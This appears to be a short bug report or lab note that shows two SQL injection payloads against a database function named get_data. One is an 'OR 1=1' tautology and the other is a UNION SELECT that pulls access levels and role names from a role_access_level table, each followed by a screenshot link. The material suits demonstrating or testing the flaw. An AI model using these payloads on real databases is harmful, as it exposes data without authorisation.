SELECT * FROM get_data('1'' OR 1=1 -- ');

![1](https://user-images.githubusercontent.com/93474882/209402878-e7519074-95dc-43aa-a815-0f8c6943228f.png)

 SELECT * FROM get_data
('1'' UNION SELECT CAST(access_level AS INTEGER),
 CAST(role_name AS VARCHAR), 
CAST(NULL AS date) FROM role_access_level -- ');

![2](https://user-images.githubusercontent.com/93474882/209403655-41209f77-905a-41a3-ab47-03cdbbcfed54.png)
